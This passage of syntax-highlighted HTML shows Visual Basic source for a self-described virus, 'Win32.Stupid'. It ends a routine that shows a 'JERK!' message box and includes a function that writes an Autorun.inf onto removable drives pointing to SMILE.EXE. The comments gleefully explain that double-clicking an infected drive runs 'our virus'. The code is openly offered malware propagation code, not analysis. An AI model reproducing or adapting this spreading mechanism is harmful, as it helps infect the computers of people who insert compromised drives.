</span><span class="sc7">MsgBox</span><span class="sc0"> </span><span class="sc4">"JERK!"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbApplicationModal</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc7">vbCritical</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Win32.Stupid"</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc1">' For the removable drives this is where we write out the autorun.inf
</span><span class="sc0">
</span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">ARD</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Dir</span><span class="sc6">(</span><span class="sc4">"Autorun.inf"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"Autorun.inf"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">Open</span><span class="sc0"> </span><span class="sc7">FD</span><span class="sc6">(</span><span class="sc7">x</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Autorun.inf"</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">Output</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"[autorun]"</span><span class="sc0">
</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"OPEN=SMILE.EXE"</span><span class="sc0">  </span><span class="sc1">' if someone were to doubleclick on an infected removable drive
</span><span class="sc7">Close</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">             </span><span class="sc1">' it would run our virus :)
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">
</span></div></body>
</html>
